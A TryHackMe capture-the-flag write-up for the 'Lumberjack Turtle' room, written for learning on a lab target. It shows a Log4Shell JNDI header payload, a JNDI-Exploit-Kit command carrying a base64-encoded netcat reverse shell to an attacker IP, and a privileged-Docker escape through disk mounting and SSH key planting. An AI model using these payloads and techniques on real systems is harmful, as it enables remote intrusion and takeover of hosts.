---
title: "Lumberjack Turtle Writeup"
date: 2022-02-01T01:25:08+05:30
draft: false
---

---
**Difficulty**: Medium Room  
**Description**: No logs, no crime… so says the lumberjack.

---

Hey folks, here is the writeup for the [Lumberjack Turtle](https://tryhackme.com/room/lumberjackturtle) room from TryHackme.

# Enumeration

## Nmap
```bash
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6a:a1:2d:13:6c:8f:3a:2d:e3:ed:84:f4:c7:bf:20:32 (RSA)
|   256 1d:ac:5b:d6:7c:0c:7b:5b:d4:fe:e8:fc:a1:6a:df:7a (ECDSA)
|_  256 13:ee:51:78:41:7e:3f:54:3b:9a:24:9b:06:e2:d5:14 (ED25519)
80/tcp    open     nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
22450/tcp filtered unknown
24740/tcp filtered unknown
25611/tcp filtered unknown
25974/tcp filtered unknown
30751/tcp filtered unknown
33989/tcp filtered unknown
36786/tcp filtered unknown
42724/tcp filtered unknown
50865/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Website (Port 80)

Visiting any random non-existent page (`/test`) throws this error with 404 status code.

![](/images/img-lumberjack-turtle-writeup-0.png)

Visiting `/error` gives the `status=999` in the error message with 500 status code.

![](/images/img-lumberjack-turtle-writeup-1.png)

I did some recursive directory enumeration and found the `/~logs/log4j` directory.

![](/images/img-lumberjack-turtle-writeup-2.png)

The response header `X-THM-HINT: CVE-2021-44228 against X-Api-Version` hints us that we have to use the `X-Api-Version` header.

Also, **CVE-2021–44228** is the Log4Shell vulnerability that affects Apache’s Java logging library Log4j which allows attackers to run commands on the affected systems remotely. It got a CVSS score of 10.0 which is the highest possible score.

![](/images/img-lumberjack-turtle-writeup-3.png)

# Exploitation

Try sending a request with `X-Api-Version: ${jndi:ldap://ATTACKER-IP:3333}` to the server. Also, keep a netcat listener running at port 3333. The netcat listener will listen a connection from the victim machine:

![](/images/img-lumberjack-turtle-writeup-4.png)

With this, we can confirm that the web application is indeed vulnerable as we have received a connection from the application.

Next, `git clone` the [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit) from GitHub. Follow the instructions on the README.md file in the github repo. Now, change directory to the JNDI-Exploit-Kit directory and run the exploit:
```bash
java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L "10.9.4.84:1389" -C "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC45LjQuODQgOTk5OSA+L3RtcC9m | base64 -d | bash"
```

The base64 payload is a simple reverse shell that connects back to our attacker machine at port 9999.

![](/images/img-lumberjack-turtle-writeup-5.png)

Grab the exploit URL from the output shown above and send the request.

Make sure to keep a listener running on port 9999.

# Privilege escalation

We get a shell as root. But it is actually inside a docker container.

![](/images/img-lumberjack-turtle-writeup-6.png)

The flag1 is located at `/opt/.flag1` Running linpeas, we can see that privileged mode is enabled. It allows us to access the host filesystem from within the docker container. We can do so by simply mounting the disk.

![](/images/img-lumberjack-turtle-writeup-7.png)

Check for disks in the system with `fdisk -l`

![](/images/img-lumberjack-turtle-writeup-8.png)

The host uses the disk at `/dev/xvda1`. Create a folder at `/mnt/host` and mount the drive:
```bash
mount /dev/xvda1 /mnt/host
```
The host filesystem can be accessed from `/mnt/host`. Use `chroot /mnt/host` to change the root filesystem. Create a SSH key pair and get a SSH session with the `id_rsa` file:
```bash
|07:52:33| root@81fbbf1def70:~/.ssh$ ls
total 16
drwx------ 2 root root 4096 Feb  1 07:52 .
drwx------ 4 root root 4096 Dec 13 01:25 ..
-rw------- 1 root root    0 Dec 13 01:23 authorized_keys
-rw------- 1 root root 1675 Feb  1 07:52 id_rsa
-rw-r--r-- 1 root root  399 Feb  1 07:52 id_rsa.pub
|07:52:47| root@81fbbf1def70:~/.ssh$ cat id_rsa.pub  >> authorized_keys
```

Log in and you’ll see a directory `/root/...`. The root flag is in this folder.

![](/images/img-lumberjack-turtle-writeup-9.png)

Happy hacking !

> Originally written on https://manash01.medium.com/lumberjack-turtle-writeup-29b647e9b694
